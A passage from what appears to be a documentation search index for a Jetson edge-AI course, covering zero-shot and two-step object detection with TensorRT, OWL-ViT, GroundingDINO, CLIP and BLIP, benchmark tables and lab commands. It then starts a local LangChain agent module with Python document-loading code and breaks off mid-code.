robotics</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#advanced-tensorrt-optimization","title":"\ud83d\udd0d Advanced TensorRT Optimization","text":"<p>The Jetson Object Detection Toolkit automatically handles TensorRT optimization with intelligent caching and precision selection.</p> <p>Automatic TensorRT Features: - Automatic ONNX export with optimizations - Dynamic shape optimization for variable input sizes - FP16 and INT8 precision support - Engine caching for faster startup - Fallback to PyTorch if TensorRT fails</p> <p>Usage Examples:</p> <pre><code># Export model to TensorRT engine\npython3 jetson_object_detection_toolkit.py --model yolov8n --export-tensorrt --precision fp16\n\n# Use existing TensorRT engine\npython3 jetson_object_detection_toolkit.py --model yolov8n --source camera --tensorrt\n\n# Compare different precisions\npython3 jetson_object_detection_toolkit.py --model yolov8n --benchmark-precision --tensorrt\n\n# Advanced optimization for Jetson Orin\npython3 jetson_object_detection_toolkit.py --model yolov8s --tensorrt --precision fp16 --workspace 2048\n</code></pre> <p>Performance Benefits: - 2-4x speedup over PyTorch inference - Reduced memory usage with optimized engines - Automatic optimization based on Jetson hardware - Persistent caching for faster subsequent runs</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#zero-shot-object-detection-with-vision-language-models","title":"\ud83e\udde0 Zero-Shot Object Detection with Vision-Language Models","text":"<p>Instead of training on fixed classes, VLMs detect objects based on text prompts like:</p> <p>\"a red backpack next to a bicycle\"</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#popular-models","title":"\ud83d\udce6 Popular Models","text":"<ul> <li>OWL-ViT (Google Research) - Vision Transformer based</li> <li>GroundingDINO - DETR-based with superior performance</li> <li>GLIP (Grounded Language Image Pretraining)</li> <li>OWL-v2 - Improved version with better accuracy</li> </ul>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#complete-installation-for-jetson","title":"\ud83d\udee0\ufe0f Complete Installation for Jetson","text":"<pre><code># Install base dependencies\npip install transformers torchvision timm opencv-python pillow\n\n# For GroundingDINO (more complex setup)\ngit clone https://github.com/IDEA-Research/GroundingDINO.git\ncd GroundingDINO\npip install -e .\n\n# Download pre-trained weights\nwget -q https://github.com/IDEA-Research/GroundingDINO/releases/download/v0.1.0-alpha/groundingdino_swint_ogc.pth\n</code></pre>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#enhanced-owl-vit-implementation","title":"\ud83d\udd0d Enhanced OWL-ViT Implementation","text":"<p>The Jetson Object Detection Toolkit provides optimized OWL-ViT implementation for zero-shot object detection using natural language prompts.</p> <p>Key Features: - Zero-shot detection with text prompts - Multiple prompt support in single inference - Optimized for Jetson hardware - Real-time performance monitoring - Automatic model compilation for speed - Colored visualization per prompt</p> <p>Usage Examples:</p> <pre><code># Zero-shot detection with text prompts\npython3 jetson_object_detection_toolkit.py --model owl-vit --source camera --prompts \"person,laptop,cell phone,bottle\"\n\n# Process image with custom prompts\npython3 jetson_object_detection_toolkit.py --model owl-vit --source image.jpg --prompts \"red car,blue bicycle\" --confidence 0.15\n\n# Interactive prompt mode\npython3 jetson_object_detection_toolkit.py --model owl-vit --source camera --interactive-prompts\n\n# Video processing with multiple prompts\npython3 jetson_object_detection_toolkit.py --model owl-vit --source video.mp4 --prompts \"person,vehicle,animal\" --output result.mp4\n</code></pre> <p>Performance Characteristics: - Speed: 2-5 FPS on Jetson Orin, 1-3 FPS on Xavier NX - Flexibility: Unlimited object classes via text prompts - Memory: Moderate GPU memory usage - Accuracy: Good for common objects, excellent for specific descriptions - Use Cases: Flexible detection, inventory management, security applications</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#groundingdino-superior-zero-shot-detection","title":"\ud83d\ude80 GroundingDINO: Superior Zero-Shot Detection","text":"<p>The Jetson Object Detection Toolkit provides optimized GroundingDINO implementation for advanced zero-shot detection with natural language understanding.</p> <p>Key Features: - Superior accuracy compared to OWL-ViT - Complex natural language prompt support - DETR-based architecture for precise localization - Automatic model downloading and setup - Optimized preprocessing for Jetson hardware - Advanced post-processing with NMS</p> <p>Usage Examples:</p> <pre><code># Advanced zero-shot detection with complex prompts\npython3 jetson_object_detection_toolkit.py --model grounding-dino --source camera --prompts \"a person wearing a red shirt,a laptop computer on a desk\"\n\n# High-precision detection with custom thresholds\npython3 jetson_object_detection_toolkit.py --model grounding-dino --source image.jpg --prompts \"smartphone in hand\" --box-threshold 0.35 --text-threshold 0.25\n\n# Complex scene understanding\npython3 jetson_object_detection_toolkit.py --model grounding-dino --source video.mp4 --prompts \"coffee cup or water bottle,person sitting at desk\" --confidence 0.3\n\n# Interactive complex prompt mode\npython3 jetson_object_detection_toolkit.py --model grounding-dino --source camera --interactive-complex-prompts\n</code></pre> <p>Performance Characteristics: - Speed: 1-3 FPS on Jetson Orin, 0.5-1.5 FPS on Xavier NX - Accuracy: Highest among zero-shot models - Memory: High GPU memory usage - Flexibility: Complex natural language understanding - Use Cases: Research applications, complex scene analysis, detailed object descriptions</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#optimization-techniques-for-jetson","title":"\u26a1 Optimization Techniques for Jetson","text":"<p>The Jetson Object Detection Toolkit automatically applies various optimization techniques for maximum performance on Jetson hardware.</p> <p>Built-in Optimizations: - Mixed Precision: Automatic FP16 conversion for VLMs - Model Compilation: Torch JIT optimization for inference - Batch Processing: Intelligent batching for video streams - Frame Caching: Smart caching to reduce redundant computations - Memory Management: Optimized GPU memory allocation - Dynamic Scaling: Adaptive processing based on hardware capabilities</p> <p>Usage Examples:</p> <pre><code># Enable all optimizations for maximum performance\npython3 jetson_object_detection_toolkit.py --model owl-vit --source camera --optimize-all --batch-size 2\n\n# Use frame caching for real-time video\npython3 jetson_object_detection_toolkit.py --model grounding-dino --source camera --cache-frames 3 --prompts \"person,vehicle\"\n\n# Mixed precision optimization\npython3 jetson_object_detection_toolkit.py --model owl-vit --source video.mp4 --fp16 --compile-model\n\n# Batch processing for video files\npython3 jetson_object_detection_toolkit.py --model yolov8n --source video.mp4 --batch-process --batch-size 4\n</code></pre> <p>Performance Improvements: - 2-3x speedup with mixed precision - 30-50% memory reduction with optimizations - Smoother real-time performance with caching - Better throughput with batch processing</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#zero-shot-vs-two-step-detection-approaches","title":"\ud83d\udd04 Zero-Shot vs Two-Step Detection Approaches","text":""},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#approach-comparison","title":"\ud83c\udfaf Approach Comparison","text":"Approach Method Advantages Disadvantages Zero-Shot VLM Single model (OWL-ViT, GroundingDINO) \u2022 Natural language prompts\u2022 No retraining needed\u2022 Complex scene understanding \u2022 Slower inference\u2022 Higher memory usage\u2022 Less accurate for common objects Two-Step (YOLO + CLIP) Detection \u2192 Classification \u2022 Faster inference\u2022 Better accuracy for known objects\u2022 Modular design \u2022 Two-stage complexity\u2022 Limited to detected objects\u2022 Requires object detection first Two-Step (YOLO + BLIP) Detection \u2192 Captioning \u2022 Rich descriptions\u2022 Context understanding\u2022 Good for scene analysis \u2022 Slowest approach\u2022 Most memory intensive\u2022 Overkill for simple detection"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#two-step-approach-implementation","title":"\ud83d\ude80 Two-Step Approach Implementation","text":"<p>The Jetson Object Detection Toolkit supports advanced two-step detection approaches that combine the speed of YOLO with the semantic understanding of vision-language models.</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#yolo-clip-for-semantic-classification","title":"YOLO + CLIP for Semantic Classification","text":"<p>The toolkit implements an optimized YOLO + CLIP pipeline that first detects objects with YOLO, then classifies them using CLIP for semantic understanding.</p> <p>Key Features: - Fast Detection: YOLO provides rapid object localization - Semantic Classification: CLIP enables natural language queries - Optimized Pipeline: Efficient crop extraction and batch processing - Real-time Performance: Optimized for Jetson hardware - Flexible Queries: Support for custom text prompts</p> <p>Usage Examples:</p> <pre><code># Two-step detection with YOLO + CLIP\npython3 jetson_object_detection_toolkit.py --model yolo-clip --source camera --prompts \"person,laptop,phone,bottle,backpack\"\n\n# Video processing with timing analysis\npython3 jetson_object_detection_toolkit.py --model yolo-clip --source video.mp4 --show-timing --save-results\n\n# Custom semantic queries\npython3 jetson_object_detection_toolkit.py --model yolo-clip --source camera --prompts \"red car,blue shirt,wooden table\"\n\n# Batch processing for better throughput\npython3 jetson_object_detection_toolkit.py --model yolo-clip --source video.mp4 --batch-size 4 --optimize-clip\n</code></pre> <p>Performance Characteristics: - YOLO Stage: 15-25ms on Jetson Orin - CLIP Stage: 30-50ms per detection - Total Pipeline: 45-75ms for typical scenes - Memory Usage: ~2GB GPU memory</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#yolo-blip-for-rich-scene-understanding","title":"YOLO + BLIP for Rich Scene Understanding","text":"<p>For applications requiring detailed scene descriptions, the toolkit supports YOLO + BLIP integration for rich captioning of detected objects.</p> <p>Key Features: - Rich Descriptions: Detailed natural language captions for each detection - Context Understanding: BLIP provides scene context and object relationships - Flexible Output: Customizable caption generation parameters - Optimized Pipeline: Efficient crop processing and batch captioning</p> <p>Usage Examples:</p> <pre><code># YOLO + BLIP for rich scene understanding\npython3 jetson_object_detection_toolkit.py --model yolo-blip --source camera --caption-mode detailed\n\n# Generate captions for video analysis\npython3 jetson_object_detection_toolkit.py --model yolo-blip --source video.mp4 --save-captions --max-caption-length 50\n\n# Real-time captioning with optimization\npython3 jetson_object_detection_toolkit.py --model yolo-blip --source camera --optimize-blip --batch-captions\n</code></pre> <p>Performance Characteristics: - YOLO Stage: 15-25ms on Jetson Orin - BLIP Stage: 100-200ms per detection - Total Pipeline: 115-225ms for typical scenes - Memory Usage: ~3GB GPU memory - Best Use Cases: Scene analysis, accessibility applications, content generation <pre><code>### \ud83d\udcca Performance Comparison on Jetson Orin Nano\n\nThe Jetson Object Detection Toolkit includes built-in benchmarking capabilities to compare different detection approaches.\n\n**Benchmark Results Summary:**\n\n| Method | Avg Time (ms) | FPS | Memory (MB) | Use Case |\n|--------|---------------|-----|-------------|----------|\n| **YOLO Only** | 15-25 | 40-65 | 1,500 | Fast detection, known objects |\n| **OWL-ViT Zero-Shot** | 200-400 | 2.5-5 | 2,500 | Flexible queries, novel objects |\n| **YOLO + CLIP** | 45-75 | 13-22 | 2,000 | Balanced speed/flexibility |\n| **YOLO + BLIP** | 115-225 | 4-9 | 3,000 | Rich scene understanding |\n| **GroundingDINO** | 300-500 | 2-3 | 2,800 | Complex natural language |\n| **Faster R-CNN** | 80-120 | 8-12 | 1,800 | High accuracy, research |\n\n**Run Benchmarks:**\n\n```bash\n# Comprehensive benchmark of all models\npython3 jetson_object_detection_toolkit.py --benchmark-all --iterations 50 --save-results\n\n# Compare specific models\npython3 jetson_object_detection_toolkit.py --benchmark --models yolov8n,owl-vit,yolo-clip --source test_images/\n\n# Memory usage analysis\npython3 jetson_object_detection_toolkit.py --benchmark --memory-profile --models all\n\n# TensorRT vs non-TensorRT comparison\npython3 jetson_object_detection_toolkit.py --benchmark --compare-tensorrt --model yolov8n\n</code></pre> <pre><code>### \ud83c\udfaf When to Use Each Approach\n\n#### Use **Zero-Shot VLMs** when:\n- \u2705 Need flexible, natural language queries\n- \u2705 Working with novel object categories\n- \u2705 Prototype development and experimentation\n- \u2705 Complex scene understanding required\n- \u274c Real-time performance not critical\n\n#### Use **YOLO + CLIP** when:\n- \u2705 Need balance between flexibility and speed\n- \u2705 Working with known object categories\n- \u2705 Want semantic classification beyond COCO classes\n- \u2705 Moderate real-time requirements\n- \u274c Can accept two-stage complexity\n\n#### Use **Traditional YOLO** when:\n- \u2705 Maximum speed required\n- \u2705 Working with standard object categories\n- \u2705 Resource-constrained environments\n- \u2705 Production deployment\n- \u274c Limited to pre-trained classes\n\n### \ud83d\udd27 Optimization Strategies for Each Approach\n\nThe Jetson Object Detection Toolkit automatically applies optimization strategies based on the selected model and hardware configuration.\n\n#### Zero-Shot VLM Optimization\n**Built-in Optimizations:**\n- **Model Quantization**: Automatic FP16 conversion for faster inference\n- **Resolution Scaling**: Dynamic input resolution based on performance targets\n- **Batch Processing**: Intelligent batching for video streams\n- **Frame Skipping**: Adaptive frame processing for real-time applications\n\n**Usage:**\n```bash\n# Apply all VLM optimizations\npython3 jetson_object_detection_toolkit.py --model owl-vit --optimize-vlm --fp16 --resolution 512\n\n# Frame skipping for real-time performance\npython3 jetson_object_detection_toolkit.py --model grounding-dino --source camera --skip-frames 3\n</code></pre></p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#two-step-approach-optimization","title":"Two-Step Approach Optimization","text":"<p>Pipeline Optimizations: - Model Selection: Automatic selection of optimal YOLO variant - Confidence Thresholding: Dynamic thresholds to reduce downstream workload - Crop Optimization: Efficient crop extraction and resizing - Async Processing: Parallel YOLO and CLIP processing</p> <p>Usage: <pre><code># Optimized two-step pipeline\npython3 jetson_object_detection_toolkit.py --model yolo-clip --optimize-pipeline --yolo-variant nano --clip-variant base\n\n# High-performance mode with async processing\npython3 jetson_object_detection_toolkit.py --model yolo-clip --source camera --async-processing --conf-threshold 0.5\n</code></pre></p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#comprehensive-lab-exercise-detection-approaches-comparison","title":"\ud83e\uddea Comprehensive Lab Exercise: Detection Approaches Comparison","text":""},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#lab-objectives","title":"\ud83c\udfaf Lab Objectives","text":"<ol> <li>Performance Analysis: Compare inference speed, memory usage, and accuracy</li> <li>Flexibility Testing: Evaluate adaptability to novel objects and scenarios</li> <li>Optimization Impact: Measure the effect of various optimization techniques</li> <li>Real-world Application: Test on diverse scenarios (indoor, outdoor, crowded scenes)</li> </ol>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#lab-setup","title":"\ud83d\udccb Lab Setup","text":"<p>The Jetson Object Detection Toolkit provides comprehensive benchmarking and comparison capabilities through built-in lab exercises.</p> <p>Lab Exercise Commands:</p> <pre><code># Run comprehensive comparison lab\npython3 jetson_object_detection_toolkit.py --lab-exercise comprehensive-comparison --save-results\n\n# Test specific scenarios\npython3 jetson_object_detection_toolkit.py --lab-exercise scenario-testing --scenarios indoor,outdoor,crowded\n\n# Performance analysis with visualization\npython3 jetson_object_detection_toolkit.py --lab-exercise performance-analysis --generate-plots --save-report\n\n# Flexibility testing with novel objects\npython3 jetson_object_detection_toolkit.py --lab-exercise flexibility-test --custom-prompts \"unusual objects,rare items\"\n</code></pre> <p>Lab Features: - Automated Testing: Run predefined test scenarios across all models - Performance Metrics: Automatic collection of timing, memory, and accuracy data - Visualization: Generate comparison charts and performance graphs - Report Generation: Comprehensive analysis reports with recommendations - Custom Scenarios: Support for user-defined test cases - Real-time Monitoring: Live performance tracking during tests</p> <p>Sample Lab Results:</p> <pre><code>\ud83e\uddea Scenario: INDOOR_OFFICE\n------------------------------------------------------------\nRank | Approach             | Time(ms)   | FPS  | Memory(MB)   | Detections\n---------------------------------------------------------------------------\n1    | YOLO Only           |     18.5   | 54.1 |      12.3    |         4\n2    | YOLO + CLIP         |     52.3   | 19.1 |      18.7    |         4\n3    | OWL-ViT Zero-Shot   |    287.4   |  3.5 |      25.1    |         3\n4    | GroundingDINO       |    412.8   |  2.4 |      28.9    |         5\n</code></pre> <p>Automated Recommendations: - \ud83d\ude80 For Real-time Applications (&gt;15 FPS): YOLO Only, YOLO + CLIP - \ud83c\udfa8 For Flexible/Novel Object Detection: GroundingDINO, OWL-ViT - \u2696\ufe0f For Balanced Performance: YOLO + CLIP with optimizations</p> <p>Test Scenarios:</p> <p><pre><code># Run predefined test scenarios\npython3 jetson_object_detection_toolkit.py --lab-exercise test-scenarios --scenarios office,street,kitchen\n\n# Custom scenario testing\npython3 jetson_object_detection_toolkit.py --lab-exercise custom-scenario --image-dir ./test_images/ --prompts \"person,laptop,chair,monitor,phone\"\n</code></pre> <pre><code>### \ud83d\udd2c Advanced Analysis Tasks\n\nThe toolkit provides specialized analysis tasks for advanced research and optimization studies.\n\n#### Task 1: Optimization Impact Study\n\n```bash\n# Study optimization impact across different configurations\npython3 jetson_object_detection_toolkit.py --advanced-analysis optimization-impact --configs baseline,fp16,tensorrt,tensorrt-batch\n\n# Compare precision vs performance trade-offs\npython3 jetson_object_detection_toolkit.py --advanced-analysis precision-study --models yolov8n --precisions fp32,fp16,int8\n\n# Batch size optimization analysis\npython3 jetson_object_detection_toolkit.py --advanced-analysis batch-optimization --batch-sizes 1,2,4,8 --model yolov8n\n</code></pre></p> <p>Optimization Configurations Tested: - Baseline: FP32, batch size 1 - FP16: Mixed precision, batch size 1 - TensorRT: Optimized engine, FP16 - TensorRT Batch: Optimized engine, batch processing</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#task-2-novel-object-detection-challenge","title":"Task 2: Novel Object Detection Challenge","text":"<pre><code># Test detection of unusual/novel objects\npython3 jetson_object_detection_toolkit.py --advanced-analysis novel-objects --prompts \"vintage typewriter,3D printed object,handmade craft,unusual gadget,electronic art\"\n\n# Zero-shot capability assessment\npython3 jetson_object_detection_toolkit.py --advanced-analysis zero-shot-eval --novel-categories custom_objects.txt\n\n# Confidence threshold analysis for novel objects\npython3 jetson_object_detection_toolkit.py --advanced-analysis confidence-analysis --novel-objects --thresholds 0.1,0.25,0.5,0.75\n</code></pre> <p>Novel Object Categories: - Vintage/antique items - 3D printed objects - Handmade crafts - Unusual gadgets - Electronic art pieces <pre><code>### \ud83d\udcdd Lab Report Template\n\nThe toolkit automatically generates comprehensive lab reports with detailed analysis and recommendations.\n\n```bash\n# Generate comprehensive lab report\npython3 jetson_object_detection_toolkit.py --generate-report --output-format markdown --save-path lab_report.md\n\n# Generate specific performance report\npython3 jetson_object_detection_toolkit.py --performance-report --models all --scenarios real-time,accuracy,resource-constrained\n\n# Export results in multiple formats\npython3 jetson_object_detection_toolkit.py --export-results --formats json,csv,html --include-visualizations\n</code></pre></p> <p>Generated Report Sections: - Executive Summary: Best performing models for different scenarios - Performance Metrics: Detailed FPS, latency, memory usage tables - Use Case Recommendations: Tailored suggestions based on requirements - Optimization Insights: Performance improvement opportunities - Visual Analytics: Charts and graphs for performance comparison - Configuration Details: Optimal settings for each model</p> <p>Sample Report Structure: <pre><code># Object Detection Performance Analysis Report\n\n## Executive Summary\n- Best Overall Performance: YOLOv8n + TensorRT\n- Best for Real-time: YOLOv8n (45 FPS)\n- Best for Accuracy: GroundingDINO (mAP 0.85)\n- Recommended for Production: YOLOv8n + TensorRT\n\n## Detailed Results\n[Automatically populated performance tables]\n\n## Use Case Recommendations\n[AI-generated recommendations based on results]\n</code></pre></p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#advanced-integration-multi-modal-scene-understanding","title":"\ud83c\udfaf Advanced Integration: Multi-Modal Scene Understanding","text":"<p>The Jetson Object Detection Toolkit provides advanced integration capabilities for comprehensive scene understanding and natural language processing.</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#multi-modal-scene-analysis","title":"Multi-Modal Scene Analysis","text":"<pre><code># Comprehensive scene analysis using multiple models\npython3 jetson_object_detection_toolkit.py --multi-modal-analysis --models yolo,clip,blip,grounding-dino --input camera\n\n# Context-aware scene understanding\npython3 jetson_object_detection_toolkit.py --scene-analysis --context \"safety equipment detection\" --fusion-strategy weighted\n\n# Real-time multi-modal processing\npython3 jetson_object_detection_toolkit.py --real-time-fusion --models yolo,clip --output-format structured\n</code></pre> <p>Multi-Modal Features: - Fast Detection: YOLO for rapid object identification - Semantic Understanding: CLIP for contextual analysis - Rich Descriptions: BLIP for detailed scene captioning - Context-Aware Detection: GroundingDINO for specific queries - Intelligent Fusion: Correlation and integration of results - Confidence Scoring: Reliability assessment across models</p> <p>Integration Strategies: - Weighted Fusion: Confidence-based result combination - Hierarchical Analysis: Progressive refinement of understanding - Context Propagation: Information flow between models - Temporal Consistency: Frame-to-frame coherence</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#integration-with-local-llms","title":"\ud83d\udd17 Integration with Local LLMs","text":"<pre><code># Scene narration with local LLM integration\npython3 jetson_object_detection_toolkit.py --llm-integration --model ollama/llama2 --style descriptive\n\n# Security report generation\npython3 jetson_object_detection_toolkit.py --generate-report --llm-style security_report --include-recommendations\n\n# Custom narration styles\npython3 jetson_object_detection_toolkit.py --narrate-scene --style \"technical,detailed\" --llm-endpoint localhost:11434\n</code></pre> <p>LLM Integration Features: - Natural Language Narration: Human-readable scene descriptions - Multiple Styles: Technical, descriptive, security-focused reports - Local LLM Support: Ollama, llama.cpp, custom endpoints - Structured Prompting: Context-aware prompt generation - Confidence Assessment: Reliability scoring for generated content - Real-time Processing: Live narration capabilities</p> <p>Supported LLM Backends: - Ollama: Local model serving (llama2, mistral, etc.) - llama.cpp: Direct model inference - Custom APIs: RESTful endpoint integration - Hugging Face: Transformers library support</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#sample-output","title":"\ud83e\udde0 Sample Output","text":"<p>\"A person is working at a desk with a laptop computer open. There's a coffee cup nearby and a smartphone on the table. The scene suggests a typical office or home workspace environment.\"</p> <p>This complete pipeline mimics human-like perception: detect \u2192 classify \u2192 understand \u2192 narrate \u2192 act.</p>"},{"location":"curriculum/my_05b_yolo_vlm_object_detection/#takeaway","title":"\ud83e\udde0 Takeaway","text":"<ul> <li>Use YOLO for real-time detection where speed matters.</li> <li>Use OWL-ViT or GroundingDINO when you need zero-shot detection flexibility.</li> <li>Combine both with LLMs to enable full-scene language understanding.</li> </ul> <p>Next: Build interactive visual assistants on Jetson!</p>"},{"location":"curriculum/my_10_local_ai_agents_jetson/","title":"\ud83e\udd16 Local AI Agents on Jetson","text":""},{"location":"curriculum/my_10_local_ai_agents_jetson/#what-are-ai-agents","title":"\ud83e\udde0 What are AI Agents?","text":"<p>AI Agents are autonomous programs that use LLMs to reason, decide, and act based on goals, memory, and tools. They can perceive their environment, make decisions, and take actions to achieve specific objectives.</p>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#key-characteristics","title":"\ud83c\udfaf Key Characteristics:","text":"<ul> <li>Autonomy: Operate independently with minimal human intervention</li> <li>Reactivity: Respond to environmental changes and user inputs</li> <li>Proactivity: Take initiative to achieve goals</li> <li>Social Ability: Interact with other agents and humans</li> <li>Learning: Improve performance through experience</li> </ul> <p>With LangChain and Jetson, we can create sophisticated local agents that:</p> <ul> <li>\ud83d\udd12 Privacy-First: Run entirely offline without internet dependency</li> <li>\u26a1 Edge Optimized: Use llama.cpp/Ollama for efficient language reasoning</li> <li>\ud83d\udee0\ufe0f Multi-Modal: Process text, PDFs, images, and structured data</li> <li>\ud83d\udd0d Intelligent Search: Perform semantic search across local documents</li> <li>\ud83c\udf10 Web Integration: Access online information when needed</li> <li>\ud83d\udcbe Persistent Memory: Maintain context across sessions</li> <li>\ud83e\uddf0 Tool Integration: Execute code, manage files, and interact with APIs</li> </ul>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#advanced-agent-architecture","title":"\ud83d\udd27 Advanced Agent Architecture","text":"<pre><code>graph TD\n    A[User Input] --&gt; B[Intent Parser]\n    B --&gt; C[Memory Manager]\n    C --&gt; D[Planning Engine LLM]\n    D --&gt; E[Tool Selector]\n    E --&gt; F[Tool Executor]\n    F --&gt; G[Result Processor]\n    G --&gt; H[Response Generator]\n    H --&gt; I[Memory Update]\n    I --&gt; J[User Output]\n\n    K[Document Store] --&gt; F\n    L[Vector Database] --&gt; F\n    M[Web Search API] --&gt; F\n    N[File System] --&gt; F\n    O[Python REPL] --&gt; F\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#core-components","title":"\ud83e\udde9 Core Components:","text":"<ol> <li>\ud83c\udfaf Intent Parser: Analyzes user input and determines task type</li> <li>\ud83e\udde0 Memory Manager: Handles short-term and long-term memory</li> <li>\ud83d\udccb Planning Engine (LLM): Creates execution plans and reasoning chains</li> <li>\ud83d\udd27 Tool Selector: Chooses appropriate tools based on context</li> <li>\u2699\ufe0f Tool Executor: Executes selected tools with proper parameters</li> <li>\ud83d\udcca Result Processor: Aggregates and validates tool outputs</li> <li>\ud83d\udcac Response Generator: Creates human-readable responses</li> <li>\ud83d\udcbe Memory Update: Stores important information for future use</li> </ol>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#data-sources","title":"\ud83d\uddc4\ufe0f Data Sources:","text":"<ul> <li>\ud83d\udcda Document Store: Local PDFs, text files, and structured documents</li> <li>\ud83d\udd0d Vector Database: Semantic search capabilities</li> <li>\ud83c\udf10 Web Search: Online information retrieval</li> <li>\ud83d\udcc1 File System: Direct file operations</li> <li>\ud83d\udc0d Python Environment: Code execution and data processing</li> </ul>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#document-processing-local-search","title":"\ud83d\udcda Document Processing &amp; Local Search","text":""},{"location":"curriculum/my_10_local_ai_agents_jetson/#multi-format-document-support","title":"\ud83d\udd0d Multi-Format Document Support","text":"<p>Our AI agent can process various document formats locally on Jetson:</p> <pre><code>import os\nimport json\nfrom typing import List, Dict, Any\nfrom pathlib import Path\n\n# Document processing imports\ntry:\n    import PyPDF2\n    import pdfplumber\nexcept ImportError:\n    print(\"Install PDF libraries: pip install PyPDF2 pdfplumber\")\n\ntry:\n    from docx import Document as DocxDocument\nexcept ImportError:\n    print(\"Install docx: pip install python-docx\")\n\ntry:\n    import pandas as pd\nexcept ImportError:\n    print(\"Install pandas: pip install pandas\")\n\nfrom langchain.document_loaders import (\n    PyPDFLoader,\n    TextLoader,\n    CSVLoader,\n    JSONLoader,\n    DirectoryLoader\n)\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.embeddings import SentenceTransformerEmbeddings\nfrom langchain.vectorstores import FAISS\nfrom langchain.schema import Document\n\nclass JetsonDocumentProcessor:\n    \"\"\"Optimized document processing for Jetson platforms\"\"\"\n\n    def __init__(self, embedding_model: str = \"all-MiniLM-L6-v2\"):\n        self.embeddings = SentenceTransformerEmbeddings(\n            model_name=embedding_model,\n            model_kwargs={'device': 'cuda' if torch.cuda.is_available() else 'cpu'}\n        )\n        self.text_splitter = RecursiveCharacterTextSplitter(\n            chunk_size=1000,\n            chunk_overlap=200,\n            separators=[\"\\n\\n\", \"\\n\", \" \", \"\"]\n        )\n        self.vectorstore = None\n        self.documents = []\n\n    def load_pdf_advanced(self, pdf_path: str) -&gt; List[Document]:\n        \"\"\"Advanced PDF processing with metadata extraction\"\"\"\n        documents = []\n\n        try:\n            # Method 1: PyPDF2 for basic extraction\n            with open(pdf_path, 'rb') as file:\n                pdf_reader = PyPDF2.PdfReader(file)\n                metadata = pdf_reader.metadata or {}\n\n                for page_num, page in enumerate(pdf_reader.pages):\n                    text = page.extract_text()\n                    if text.strip():\n                        doc = Document(\n                            page_content=text,\n                            metadata={\n                                \"source\": pdf_path,\n                                \"page\": page_num + 1,\n                                \"title\": metadata.get('/Title', 'Unknown'),\n                                \"author\": metadata.get('/Author', 'Unknown'),\n                                \"type\": \"pdf\"\n                            }\n                        )\n                        documents.append(doc)\n\n        except Exception as e:\n            print(f\"PyPDF2 failed for {pdf_path}: {e}\")\n\n            # Fallback: pdfplumber for better text extraction\n            try:\n                with pdfplumber.open(pdf_path) as pdf:\n                    for page_num, page in enumerate(pdf.pages):\n                        text = page.extract_text()\n                        if text and text.strip():\n                            doc = Document(\n                                page_content=text,\n                                metadata={\n                                    \"source\": pdf_path,\n                                    \"page\": page_num + 1,\n                                    \"type\": \"pdf\",\n                                    \"extraction_method\": \"pdfplumber\"\n                                }\n                            )\n                            documents.append(doc)\n            except Exception as e2:\n                print(f\"pdfplumber also failed for {pdf_path}: {e2}\")\n\n        return documents\n\n    def load_directory(self, directory_path: str) -&gt; List[Document]:\n        \"\"\"Load all supported documents from directory\"\"\"\n        documents = []\n        directory = Path(directory_path)\n\n        # Supported file extensions\n        loaders = {\n            '.pdf': self.load_pdf_advanced,\n            '.txt': lambda x: [Document(page_content=open(x, 'r', encoding='utf-8').read(), \n                                      metadata={\"source\": x, \"type\": \"text\"})],\n            '.md': lambda x: [Document(page_content=open(x, 'r', encoding='utf-8').read(), \n                                     metadata={\"source\": x, \"type\": \"markdown\"})],\n            '.json': self._load_json,\n            '.csv': self._load_csv,\n            '.docx': self._load_docx\n        }\n\n        for file_path in directory.rglob('*'):\n            if file_path.is_file() and file_path.suffix.lower() in loaders:\n                try:\n                    print(f\"Processing: {file_path}\")\n                    file_docs = loaders[file_path.suffix.lower()](str(file_path))\n                    documents.extend(file_docs)\n                except Exception as e:\n                    print(f\"Error processing {file_path}: {e}\")\n\n        return documents\n\n    def _load_json(self, file_path: str) -&gt; List[Document]:\n        \"\"\"Load JSON files\"\"\"\n        with open(file_path, 'r', encoding='utf-8') as f:\n            data = json.load(f)\n\n        if isinstance(data, list):\n            documents = []\n            for i, item in enumerate(data):\n                content = json.dumps(item, indent=2)\n                doc = Document(\n                    page_content=content,\n                    metadata={\"source\": file_path, \"index\": i, \"type\": \"json\"}\n                )\n                documents.append(doc)\n            return documents\n        else:\n            content = json.dumps(data, indent=2)\n            return [Document(\n                page_content=content,\n                metadata={\"source\": file_path, \"type\": \"json\"}\n            )]\n\n    def _load_csv(self, file_path: str) -&gt; List[Document]:\n        \"\"\"Load CSV files\"\"\"\n        df = pd.read_csv(file_path)\n        documents = []\n\n        # Convert each row to a document\n        for index, row in df.iterrows():\n            content = \"\\n\".join([f\"{col}: {val}\" for col, val in row.items()])\n            doc = Document(\n                page_content=content,\n                metadata={\"source\": file_path, \"row\": index, \"type\": \"csv\"}\n            )\n            documents.append(doc)\n\n        return documents\n\n    def _load_docx(self, file_path: str) -&gt; List[Document]:\n        \"\"\"Load DOCX files\"\"\"\n        try:\n            doc = DocxDocument(file_path)\n            content = \"\\n\".join([paragraph.text for paragraph in doc.paragraphs])\n            return [Document(\n                page_content=content,\n           